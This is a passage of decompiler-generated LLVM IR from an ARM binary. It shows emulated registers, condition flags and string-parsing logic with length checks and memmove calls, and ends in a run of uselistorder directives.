  %v2_a9a8 = add i32 %v0_a9a8, %v2_a9a0
  store i32 %v2_a9a8, i32* @r0, align 4
  %v2_a9ac = inttoptr i32 %v2_a9a8 to i8*
  %v3_a9ac = call i32 @function_14634(i8* %v2_a9ac, i32 %v0_a9a4)
  store i32 %v3_a9ac, i32* %r0.global-to-local, align 4
  %v0_a9b0 = load i32, i32* @r8, align 4
  %v1_a9b0 = add i32 %v0_a9b0, 12
  %v2_a9b0 = inttoptr i32 %v1_a9b0 to i32*
  %v3_a9b0 = load i32, i32* %v2_a9b0, align 4
  %v1_a9b4 = add i32 %v3_a9b0, 1
  store i32 %v1_a9b4, i32* %r3.global-to-local, align 4
  store i32 %v1_a9b4, i32* %v2_a9b0, align 4
  br label %dec_label_pc_a88c

dec_label_pc_a9c0:                                ; preds = %dec_label_pc_a5a4
  store i32 7, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  store i32 7, i32* %stack_var_-40, align 4
  %v0_a9cc = load i32, i32* @r5, align 4
  %v1_a9cc = add i32 %v0_a9cc, 4
  %v2_a9cc = inttoptr i32 %v1_a9cc to i8*
  %v3_a9cc = load i8, i8* %v2_a9cc, align 1
  %v4_a9cc = zext i8 %v3_a9cc to i32
  store i32 %v4_a9cc, i32* %r3.global-to-local, align 4
  %v2_a9d0 = icmp ugt i8 %v3_a9cc, 114
  store i1 %v2_a9d0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a9d0 = icmp ult i8 %v3_a9cc, 115
  store i1 %v6_a9d0, i1* %cpsr_n.global-to-local, align 1
  %v7_a9d0 = icmp eq i8 %v3_a9cc, 115
  store i1 %v7_a9d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a9d0, label %bb242, label %.thread69

bb242:                                            ; preds = %dec_label_pc_a9c0
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 8, i32* %stack_var_-40, align 4
  br label %.thread69

.thread69:                                        ; preds = %dec_label_pc_a9c0, %bb242
  %v3_a9e0 = phi i32 [ 7, %dec_label_pc_a9c0 ], [ 8, %bb242 ]
  %v0_a9e4 = load i32, i32* @r7, align 4
  %v1_a9e4 = sub nsw i32 1, %v3_a9e0
  %v2_a9e8 = add i32 %v1_a9e4, %v0_a9e4
  store i32 %v2_a9e8, i32* %r2.global-to-local, align 4
  store i32 %v0_a9cc, i32* %r0.global-to-local, align 4
  %v2_a9f0 = add i32 %v3_a9e0, %v0_a9cc
  store i32 %v2_a9f0, i32* %r1.global-to-local, align 4
  %v3_a9f4 = call i32 @_memmove(i32 %v0_a9cc, i32 %v2_a9f0, i32 %v2_a9e8)
  store i32 %v3_a9f4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v0_aa04 = load i32, i32* @r6, align 4
  %v1_aa04 = load i32, i32* @r4, align 4
  %v2_aa04 = add i32 %v1_aa04, %v0_aa04
  %v3_aa04 = inttoptr i32 %v2_aa04 to i8*
  %v4_aa04 = load i8, i8* %v3_aa04, align 1
  %v6_aa04 = zext i8 %v4_aa04 to i32
  store i32 %v6_aa04, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v9_aa08 = icmp eq i8 %v4_aa04, 0
  store i1 %v9_aa08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aa08, label %dec_label_pc_aa48, label %dec_label_pc_aa10

dec_label_pc_aa10:                                ; preds = %.thread69
  %v2_aa10 = icmp ugt i8 %v4_aa04, 46
  store i1 %v2_aa10, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_aa10 = icmp ult i8 %v4_aa04, 47
  store i1 %v6_aa10, i1* %cpsr_n.global-to-local, align 1
  %v7_aa10 = icmp eq i8 %v4_aa04, 47
  store i1 %v7_aa10, i1* %cpsr_z.global-to-local, align 1
  %v1_aa14 = load i32, i32* @r5, align 4
  br i1 %v7_aa10, label %bb243, label %dec_label_pc_aa1c

bb243:                                            ; preds = %dec_label_pc_aa10
  store i32 %v1_aa14, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ab2c

dec_label_pc_aa1c:                                ; preds = %dec_label_pc_aa10
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_aa2c

dec_label_pc_aa24:                                ; preds = %dec_label_pc_aa2c
  %v2_aa24 = icmp ugt i8 %v4_aa34, 46
  store i1 %v2_aa24, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_aa24 = icmp ult i8 %v4_aa34, 47
  store i1 %v6_aa24, i1* %cpsr_n.global-to-local, align 1
  %v7_aa24 = icmp eq i8 %v4_aa34, 47
  store i1 %v7_aa24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa24, label %dec_label_pc_ab2c, label %dec_label_pc_aa2c

dec_label_pc_aa2c:                                ; preds = %dec_label_pc_aa24, %dec_label_pc_aa1c
  %v1_aa3c = phi i32 [ %v1_aa40, %dec_label_pc_aa24 ], [ 1, %dec_label_pc_aa1c ]
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  store i32 %v1_aa3c, i32* %stack_var_-40, align 4
  %v2_aa34 = add i32 %v1_aa3c, %v1_aa14
  %v3_aa34 = inttoptr i32 %v2_aa34 to i8*
  %v4_aa34 = load i8, i8* %v3_aa34, align 1
  %v6_aa34 = zext i8 %v4_aa34 to i32
  store i32 %v6_aa34, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_aa38 = icmp eq i8 %v4_aa34, 0
  store i1 %v2_aa38, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_aa34, i32* %r1.global-to-local, align 4
  %v1_aa40 = add i32 %v1_aa3c, 1
  store i32 %v1_aa40, i32* %r3.global-to-local, align 4
  br i1 %v2_aa38, label %dec_label_pc_aa48, label %dec_label_pc_aa24

dec_label_pc_aa48:                                ; preds = %dec_label_pc_aa2c, %.thread69, %dec_label_pc_ab2c
  %v0_aa48 = load i32, i32* @r5, align 4
  store i32 %v0_aa48, i32* %r0.global-to-local, align 4
  %v1_aa4c = inttoptr i32 %v0_aa48 to i8*
  %v2_aa4c = call i32 @function_1460c(i8* %v1_aa4c)
  store i32 %v2_aa4c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_aa50 = icmp slt i32 %v2_aa4c, 0
  store i1 %v1_aa50, i1* %cpsr_n.global-to-local, align 1
  %v2_aa50 = icmp eq i32 %v2_aa4c, 0
  store i1 %v2_aa50, i1* %cpsr_z.global-to-local, align 1
  %tmp244 = icmp slt i32 %v2_aa4c, 1
  br i1 %tmp244, label %dec_label_pc_aa74, label %dec_label_pc_aa58

dec_label_pc_aa58:                                ; preds = %dec_label_pc_aa48
  %v0_aa58 = load i32, i32* @r5, align 4
  store i32 %v0_aa58, i32* %r0.global-to-local, align 4
  %v1_aa5c = inttoptr i32 %v0_aa58 to i8*
  %v2_aa5c = call i32 @function_1460c(i8* %v1_aa5c)
  store i32 %v2_aa5c, i32* %r0.global-to-local, align 4
  %v1_aa60 = add i32 %v2_aa5c, -127
  %v2_aa60 = icmp ugt i32 %v2_aa5c, 126
  store i1 %v2_aa60, i1* %cpsr_c.global-to-local, align 1
  %v3_aa60 = sub i32 126, %v2_aa5c
  %v4_aa60 = and i32 %v3_aa60, %v2_aa5c
  %v5_aa60 = icmp slt i32 %v4_aa60, 0
  store i1 %v5_aa60, i1* %cpsr_v.global-to-local, align 1
  %v6_aa60 = icmp slt i32 %v1_aa60, 0
  store i1 %v6_aa60, i1* %cpsr_n.global-to-local, align 1
  %v7_aa60 = icmp eq i32 %v2_aa5c, 127
  store i1 %v7_aa60, i1* %cpsr_z.global-to-local, align 1
  %v7_aa64 = icmp sgt i32 %v2_aa5c, 127
  br i1 %v7_aa64, label %.thread72, label %bb245

bb245:                                            ; preds = %dec_label_pc_aa58
  %v8_aa64 = load i32, i32* %sb.global-to-local, align 4
  %v9_aa68 = add i32 %v8_aa64, 789
  store i32 %v9_aa68, i32* %r0.global-to-local, align 4
  %v8_aa6c = load i32, i32* @r5, align 4
  store i32 %v8_aa6c, i32* %r1.global-to-local, align 4
  br label %.thread72

.thread72:                                        ; preds = %dec_label_pc_aa58, %bb245
  store i32 43636, i32* %lr.global-to-local, align 4
  %v3_aa70 = xor i1 %v6_aa60, %v5_aa60
  %v4_aa70 = or i1 %v7_aa60, %v3_aa70
  call void @__pseudo_cond_branch(i1 %v4_aa70, i32 ptrtoint (i32* @global_var_14634.103 to i32))
  br label %dec_label_pc_aa74

dec_label_pc_aa74:                                ; preds = %dec_label_pc_aa48, %.thread72
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v3_aa78 = load i32, i32* %stack_var_-40, align 4
  %v0_aa7c = load i32, i32* @r5, align 4
  %v2_aa7c = add i32 %v3_aa78, 1
  %v1_aa80 = add i32 %v2_aa7c, %v0_aa7c
  store i32 %v1_aa80, i32* %r0.global-to-local, align 4
  %v1_aa84 = inttoptr i32 %v1_aa80 to i8*
  %v2_aa84 = call i32 @function_1460c(i8* %v1_aa84)
  store i32 %v2_aa84, i32* %r0.global-to-local, align 4
  %v1_aa88 = add i32 %v2_aa84, -255
  %v2_aa88 = icmp ugt i32 %v2_aa84, 254
  store i1 %v2_aa88, i1* %cpsr_c.global-to-local, align 1
  %v3_aa88 = sub i32 254, %v2_aa84
  %v4_aa88 = and i32 %v3_aa88, %v2_aa84
  %v5_aa88 = icmp slt i32 %v4_aa88, 0
  store i1 %v5_aa88, i1* %cpsr_v.global-to-local, align 1
  %v6_aa88 = icmp slt i32 %v1_aa88, 0
  store i1 %v6_aa88, i1* %cpsr_n.global-to-local, align 1
  %v7_aa88 = icmp eq i32 %v2_aa84, 255
  store i1 %v7_aa88, i1* %cpsr_z.global-to-local, align 1
  %v8_aa8c = icmp sgt i32 %v2_aa84, 255
  br i1 %v8_aa8c, label %dec_label_pc_a5dc, label %dec_label_pc_aa90

dec_label_pc_aa90:                                ; preds = %dec_label_pc_aa74
  %v0_aa90 = load i32, i32* %sb.global-to-local, align 4
  %v1_aa94 = add i32 %v0_aa90, 533
  store i32 %v1_aa94, i32* @r4, align 4
  store i32 %v1_aa94, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_aaa0 = call i32 @function_146ac(i32 %v1_aa94, i32 255)
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  %v3_aaa8 = load i32, i32* %stack_var_-40, align 4
  %v0_aaac = load i32, i32* @r5, align 4
  %v2_aaac = add i32 %v3_aaa8, 1
  %v1_aab0 = add i32 %v2_aaac, %v0_aaac
  store i32 %v1_aab0, i32* %r0.global-to-local, align 4
  %v1_aab4 = inttoptr i32 %v1_aab0 to i8*
  %v2_aab4 = call i32 @function_1460c(i8* %v1_aab4)
  store i32 %v2_aab4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_aab8 = icmp slt i32 %v2_aab4, 0
  store i1 %v1_aab8, i1* %cpsr_n.global-to-local, align 1
  %v2_aab8 = icmp eq i32 %v2_aab4, 0
  store i1 %v2_aab8, i1* %cpsr_z.global-to-local, align 1
  %tmp246 = icmp slt i32 %v2_aab4, 1
  br i1 %tmp246, label %dec_label_pc_a5dc, label %dec_label_pc_aac0

dec_label_pc_aac0:                                ; preds = %dec_label_pc_aa90
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  %v3_aac4 = load i32, i32* %stack_var_-40, align 4
  %v0_aac8 = load i32, i32* @r5, align 4
  %v0_aacc = load i32, i32* @r4, align 4
  store i32 %v0_aacc, i32* @r0, align 4
  %v2_aac8 = add i32 %v3_aac4, 1
  %v1_aad0 = add i32 %v2_aac8, %v0_aac8
  store i32 %v1_aad0, i32* %r1.global-to-local, align 4
  %v2_aad4 = inttoptr i32 %v0_aacc to i8*
  %v3_aad4 = call i32 @function_14634(i8* %v2_aad4, i32 %v1_aad0)
  store i32 %v3_aad4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a5dc

dec_label_pc_aadc:                                ; preds = %dec_label_pc_a344
  %v0_aadc = load i32, i32* @r4, align 4
  %v1_aadc = trunc i32 %v0_aadc to i8
  %v2_aadc = load i32, i32* @r8, align 4
  %v3_aadc = add i32 %v2_aadc, -1452
  %v4_aadc = inttoptr i32 %v3_aadc to i8*
  store i8 %v1_aadc, i8* %v4_aadc, align 1
  br label %dec_label_pc_9590

dec_label_pc_aae4:                                ; preds = %dec_label_pc_a55c
  %v1_aae4 = add i32 %v0_aae4, 1
  store i32 %v1_aae4, i32* %ip.global-to-local, align 4
  %v2_aae8 = add i32 %v0_a55c, %v1_aae4
  store i32 %v2_aae8, i32* %r4.global-to-local, align 4
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  store i32 %v2_aae8, i32* %r0.global-to-local, align 4
  store i32 %v1_aae4, i32* %stack_var_-40, align 4
  %v1_aaf8 = inttoptr i32 %v2_aae8 to i8*
  %v2_aaf8 = call i32 @function_1460c(i8* %v1_aaf8)
  store i32 %v2_aaf8, i32* %r0.global-to-local, align 4
  %v0_aafc = load i32, i32* %r4.global-to-local, align 4
  %v2_aafc = add i32 %v0_aafc, %v2_aaf8
  %v1_ab00 = add i32 %v2_aafc, -1
  %v2_ab00 = inttoptr i32 %v1_ab00 to i8*
  %v3_ab00 = load i8, i8* %v2_ab00, align 1
  %v4_ab00 = zext i8 %v3_ab00 to i32
  store i32 %v4_ab00, i32* %r3.global-to-local, align 4
  %v2_ab04 = icmp ugt i8 %v3_ab00, 33
  store i1 %v2_ab04, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_ab04 = icmp ult i8 %v3_ab00, 34
  store i1 %v6_ab04, i1* %cpsr_n.global-to-local, align 1
  %v7_ab04 = icmp eq i8 %v3_ab00, 34
  store i1 %v7_ab04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ab04, label %dec_label_pc_ab0c, label %dec_label_pc_a568

dec_label_pc_ab0c:                                ; preds = %dec_label_pc_aae4
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  %v3_ab10 = load i32, i32* %stack_var_-40, align 4
  %v0_ab14 = load i32, i32* @r6, align 4
  %v2_ab14 = add i32 %v0_ab14, %v3_ab10
  store i32 %v2_ab14, i32* %r4.global-to-local, align 4
  store i32 %v2_ab14, i32* %r0.global-to-local, align 4
  %v1_ab1c = inttoptr i32 %v2_ab14 to i8*
  %v2_ab1c = call i32 @function_1460c(i8* %v1_ab1c)
  store i32 %v2_ab1c, i32* %r0.global-to-local, align 4
  %v2_ab20 = add i32 %v2_ab14, %v2_ab1c
  %v0_ab24 = load i32, i32* @r5, align 4
  %v1_ab24 = trunc i32 %v0_ab24 to i8
  %v3_ab24 = add i32 %v2_ab20, -1
  %v4_ab24 = inttoptr i32 %v3_ab24 to i8*
  store i8 %v1_ab24, i8* %v4_ab24, align 1
  br label %dec_label_pc_a568

dec_label_pc_ab2c:                                ; preds = %dec_label_pc_aa24, %bb243
  %v2_ab30 = phi i32 [ %v1_aa14, %bb243 ], [ %v2_aa34, %dec_label_pc_aa24 ]
  store i32 0, i32* %ip.global-to-local, align 4
  %v3_ab30 = inttoptr i32 %v2_ab30 to i8*
  store i8 0, i8* %v3_ab30, align 1
  br label %dec_label_pc_aa48

dec_label_pc_ab38:                                ; preds = %dec_label_pc_a5d0
  store i32 %v10_9048, i32* %ip.global-to-local, align 4
  %v3_ab3c = load i32, i32* %stack_var_-40, align 4
  %v0_ab40 = load i32, i32* @r5, align 4
  %v2_ab40 = add i32 %v3_ab3c, 1
  %v1_ab44 = add i32 %v2_ab40, %v0_ab40
  store i32 %v1_ab44, i32* %r0.global-to-local, align 4
  %v1_ab48 = inttoptr i32 %v1_ab44 to i8*
  %v2_ab48 = call i32 @function_1460c(i8* %v1_ab48)
  store i32 %v2_ab48, i32* %r0.global-to-local, align 4
  %v1_ab4c = add i32 %v2_ab48, -255
  %v2_ab4c = icmp ugt i32 %v2_ab48, 254
  store i1 %v2_ab4c, i1* %cpsr_c.global-to-local, align 1
  %v3_ab4c = sub i32 254, %v2_ab48
  %v4_ab4c = and i32 %v3_ab4c, %v2_ab48
  %v5_ab4c = icmp slt i32 %v4_ab4c, 0
  store i1 %v5_ab4c, i1* %cpsr_v.global-to-local, align 1
  %v6_ab4c = icmp slt i32 %v1_ab4c, 0
  store i1 %v6_ab4c, i1* %cpsr_n.global-to-local, align 1
  %v7_ab4c = icmp eq i32 %v2_ab48, 255
  store i1 %v7_ab4c, i1* %cpsr_z.global-to-local, align 1
  %v8_ab50 = icmp sgt i32 %v2_ab48, 255
  br i1 %v8_ab50, label %dec_label_pc_a5dc, label %dec_label_pc_ab54

dec_label_pc_ab54:                                ; preds = %dec_label_pc_ab38
  %v0_ab54 = load i32, i32* %sb.global-to-local, align 4
  %v1_ab58 = add i32 %v0_ab54, 533
  store i32 %v1_ab58, i32* @r4, align 4
  store i32 %v1_ab58, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_ab64 = call i32 @function_146ac(i32 %v1_ab58, i32 255)
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  %v3_ab6c = load i32, i32* %stack_var_-40, align 4
  %v0_ab70 = load i32, i32* @r5, align 4
  %v2_ab70 = add i32 %v3_ab6c, 1
  %v1_ab74 = add i32 %v2_ab70, %v0_ab70
  store i32 %v1_ab74, i32* %r0.global-to-local, align 4
  %v1_ab78 = inttoptr i32 %v1_ab74 to i8*
  %v2_ab78 = call i32 @function_1460c(i8* %v1_ab78)
  store i32 %v2_ab78, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_ab7c = icmp slt i32 %v2_ab78, 0
  store i1 %v1_ab7c, i1* %cpsr_n.global-to-local, align 1
  %v2_ab7c = icmp eq i32 %v2_ab78, 0
  store i1 %v2_ab7c, i1* %cpsr_z.global-to-local, align 1
  %tmp247 = icmp slt i32 %v2_ab78, 1
  br i1 %tmp247, label %dec_label_pc_a5dc, label %dec_label_pc_ab84

dec_label_pc_ab84:                                ; preds = %dec_label_pc_ab54
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  %v3_ab88 = load i32, i32* %stack_var_-40, align 4
  %v0_ab8c = load i32, i32* @r5, align 4
  %v0_ab90 = load i32, i32* @r4, align 4
  store i32 %v0_ab90, i32* @r0, align 4
  %v2_ab8c = add i32 %v3_ab88, 1
  %v1_ab94 = add i32 %v2_ab8c, %v0_ab8c
  store i32 %v1_ab94, i32* %r1.global-to-local, align 4
  %v2_ab98 = inttoptr i32 %v0_ab90 to i8*
  %v3_ab98 = call i32 @function_14634(i8* %v2_ab98, i32 %v1_ab94)
  store i32 %v3_ab98, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a5dc

dec_label_pc_abc8:                                ; preds = %dec_label_pc_919c, %dec_label_pc_91d4
  %v0_9220 = call i32 @function_117dc()
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_9228 = urem i32 %v0_9220, 5
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_922c = icmp ult i32 %v2_9228, 4
  store i1 %v6_922c, i1* %cpsr_n.global-to-local, align 1
  %v7_922c = icmp eq i32 %v2_9228, 4
  store i1 %v7_922c, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 47, i32* %r0.global-to-local, align 4
  %v1_ac30 = call i32 @function_13ce8(i32 47)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 47, i32* %r0.global-to-local, align 4
  %v3_ac3c = call i32 @function_13c04(i32 47, i32* null)
  store i32 %v3_ac3c, i32* %r1.global-to-local, align 4
  %v0_ac44 = load i32, i32* @r5, align 4
  %v1_ac44 = add i32 %v0_ac44, 20
  store i32 %v1_ac44, i32* @r0, align 4
  %v2_ac48 = inttoptr i32 %v1_ac44 to i8*
  %v3_ac48 = call i32 @function_14634(i8* %v2_ac48, i32 %v3_ac3c)
  store i32 47, i32* %r0.global-to-local, align 4
  %v1_ac50 = call i32 @function_13c30(i32 47)
  %v0_abc8 = load i32, i32* @sl, align 4
  store i32 %v0_abc8, i32* %r1.global-to-local, align 4
  store i32 %v0_9164, i32* @r0, align 4
  %v2_abd0 = inttoptr i32 %v0_9164 to i8*
  %v3_abd0 = call i32 @function_14634(i8* %v2_abd0, i32 %v0_abc8)
  store i32 %v3_abd0, i32* %r0.global-to-local, align 4
  store i32 %v0_90f4, i32* %r1.global-to-local, align 4
  %v0_abd8 = load i32, i32* @r7, align 4
  %v1_abd8 = add i32 %v0_abd8, 1
  store i32 %v1_abd8, i32* @r7, align 4
  %v0_abdc = load i32, i32* @r5, align 4
  %v2_abe0 = sub i32 %v0_90f4, %v1_abd8
  %v3_abe0 = icmp uge i32 %v0_90f4, %v1_abd8
  store i1 %v3_abe0, i1* %cpsr_c.global-to-local, align 1
  %v4_abe0 = xor i32 %v1_abd8, %v0_90f4
  %v5_abe0 = xor i32 %v2_abe0, %v0_90f4
  %v6_abe0 = and i32 %v5_abe0, %v4_abe0
  %v7_abe0 = icmp slt i32 %v6_abe0, 0
  store i1 %v7_abe0, i1* %cpsr_v.global-to-local, align 1
  %v8_abe0 = icmp slt i32 %v2_abe0, 0
  store i1 %v8_abe0, i1* %cpsr_n.global-to-local, align 1
  %v9_abe0 = icmp eq i32 %v0_90f4, %v1_abd8
  store i1 %v9_abe0, i1* %cpsr_z.global-to-local, align 1
  %v1_abe4 = add i32 %v0_abdc, 3140
  store i32 %v1_abe4, i32* @r5, align 4
  br i1 %v9_abe0, label %dec_label_pc_abec, label %dec_label_pc_9124

dec_label_pc_abec:                                ; preds = %dec_label_pc_abc8
  %v1_abf8 = add i32 %v2_9108, 1456
  %v0_ac00 = load i32, i32* %r8.global-to-local, align 4
  %v1_ac00 = urem i32 %v0_ac00, 256
  store i32 %v1_ac00, i32* %ip.global-to-local, align 4
  %v1_ac04 = add i32 %v2_9108, 1464
  store i32 %v1_ac04, i32* %r2.global-to-local, align 4
  %v2_ac08 = ptrtoint i32* %stack_var_-10568 to i32
  store i32 %v2_ac08, i32* %r3.global-to-local, align 4
  store i32 %v1_abf8, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_9280.preheader

; uselistorder directives
  uselistorder i32 %v2_ac08, { 1, 0 }
  uselistorder i32 %v1_ac04, { 1, 0 }
  uselistorder i32 %v1_abf8, { 1, 0 }
  uselistorder i32 %v1_abe4, { 1, 0 }
  uselistorder i32 %v2_abe0, { 1, 0 }
  uselistorder i32 %v1_abd8, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v2_9228, { 1, 0 }
  uselistorder i32 %v2_ab48, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v1_aae4, { 1, 0, 2 }
  uselistorder i32 %v2_aa84, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v2_aa5c, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v1_aa40, { 1, 0 }
  uselistorder i8 %v4_aa34, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_aa3c, { 1, 0, 2 }
  uselistorder i1 %v7_aa24, { 1, 0 }
  uselistorder i32 %v1_aa14, { 1, 0, 2 }
  uselistorder i1 %v7_aa10, { 1, 0 }
  uselistorder i1 %v9_aa08, { 1, 0 }
  uselistorder i32 %v2_a9e8, { 1, 0 }
  uselistorder i32 %v0_a9cc, { 2, 0, 1, 3 }
  uselistorder i32 %v2_a968, { 1, 0, 2 }
  uselistorder i32 %v1_a960, { 1, 0, 2 }
  uselistorder i32 %v2_a918, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v2_a8ec, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v3_a870, { 5, 1, 0, 4, 3, 2, 6 }
  uselistorder i32 %v2_a854, { 1, 0, 2 }
  uselistorder i32 %v4_a84c, { 2, 1, 0, 3 }
  uselistorder i32 %v2_a814, { 1, 0 }
  uselistorder i32 %v1_a814, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v0_a814, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v2_a77c, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v2_a754, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v1_a734, { 1, 0 }
  uselistorder i8 %v4_a72c, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v0_a734, { 1, 0, 3, 2 }
  uselistorder i1 %v7_a718, { 1, 0 }
  uselistorder i32 %v1_a708, { 1, 0, 2 }
  uselistorder i1 %v7_a704, { 1, 0 }
  uselistorder i32 %v0_a6c4, { 2, 0, 1, 3 }
  uselistorder i32 %v2_a6a8, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v5_a5c4, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v2_a598, { 1, 0 }
  uselistorder i32 %v1_a598, { 2, 0, 1, 3 }
  uselistorder i32 %v1_a594, { 3, 0, 1, 4, 2 }
  uselistorder i32 %v1_a574, { 0, 2, 1, 3 }
  uselistorder i32 %v0_a55c, { 1, 0 }
  uselistorder i32 %v0_aae4, { 1, 0 }
  uselistorder i32 %v1_a518, { 1, 2, 0 }
  uselistorder i32 %v5_a514, { 0, 2, 1, 3 }
  uselistorder i32 %v0_a500, { 1, 0 }
  uselistorder i32 %v2_a4f4, { 1, 0, 2 }
  uselistorder i32 %v1_a4b8, { 0, 2, 1 }
  uselistorder i32 %v1_a4a8, { 1, 0, 3, 4, 2 }
  uselistorder i32 %v1_a494, { 0, 2, 1, 3 }
  uselistorder i32 %v1_a450, { 1, 2, 0 }
  uselistorder i32 %v5_a44c, { 1, 3, 2, 5, 8, 9, 7, 6, 4, 0, 11, 10, 12 }
  uselistorder i32 %v2_a434.v4_a414, { 1, 0, 2 }
  uselistorder i32 %v1_a3f0, { 1, 2, 0 }
  uselistorder i32 %v4_a3e8, { 0, 2, 1, 3 }
  uselistorder i32 %v2_a3a8, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v2_a3a0, { 1, 2, 0 }
  uselistorder i32 %v4_a394, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v1_a320, { 1, 2, 0 }
  uselistorder i32 %v4_a31c, { 0, 2, 1, 3 }
  uselistorder i32 %v5_a2fc, { 1, 2, 3, 0 }
  uselistorder i32 %v1_a2e4, { 1, 2, 0 }
  uselistorder i32 %v5_a2e0, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a2c8, { 1, 0 }
  uselistorder i32 %v2_a2c0, { 1, 2, 0 }
  uselistorder i32 %v4_a2bc, { 0, 2, 1, 3 }
  uselistorder i32 %v0_a280, { 2, 1, 0 }
  uselistorder i32 %v3_a274, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v3_a254, { 4, 5, 6, 7, 3, 1, 2, 0 }
  uselistorder i32* %v2_a254, { 1, 0 }
  uselistorder i32 %v0_a254, { 1, 0 }
  uselistorder i32 %v3_a23c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_a230, { 1, 2, 0 }
  uselistorder i32 %v0_a218, { 0, 2, 1 }
  uselistorder i32 %v3_a1f8, { 0, 3, 4, 2, 1, 5 }
  uselistorder i32 %storemerge73, { 1, 0 }
  uselistorder i32 %v3_a1d0, { 0, 3, 4, 2, 1, 5 }
  uselistorder i32 %v1_a1b0, { 1, 2, 0 }
  uselistorder i32 %v4_a1a4, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32 %v3_a170, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v1_a168, { 0, 3, 1, 4, 2, 5, 6 }
  uselistorder i32 %v5_a13c, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v1_a11c, { 1, 0, 2 }
  uselistorder i32 %v1_a0f8, { 1, 2, 0 }
  uselistorder i32 %v5_a0f4, { 1, 8, 7, 2, 5, 6, 4, 3, 9, 0, 11, 10, 12 }
  uselistorder i32 %v2_a0dc.v4_a0bc, { 1, 0, 2 }
  uselistorder i32 %v1_a09c, { 1, 2, 0 }
  uselistorder i32 %v4_a098, { 0, 2, 1, 3 }
  uselistorder i32 %v2_a048, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v0_a044, { 1, 0 }
  uselistorder i32 %v0_a02c, { 1, 0 }
  uselistorder i32 %v0_a030, { 1, 0 }
  uselistorder i32 %v2_a00c, { 1, 0 }
  uselistorder i32 %v1_a008, { 3, 4, 2, 1, 6, 0, 7, 5, 8 }
  uselistorder i32 %v3_a004, { 2, 4, 0, 1, 5, 3 }
  uselistorder i32 %v0_9fd4, { 1, 0 }
  uselistorder i1 %v7_9f9c, { 0, 2, 1 }
  uselistorder i32 %v1_9fc0, { 1, 0 }
  uselistorder i32 %v2_9fbc, { 1, 0 }
  uselistorder i32 %v3_9fb8, { 0, 1, 4, 3, 6, 2, 7, 5, 8 }
  uselistorder i32 %v2_9fb0, { 2, 4, 0, 1, 5, 3, 6 }
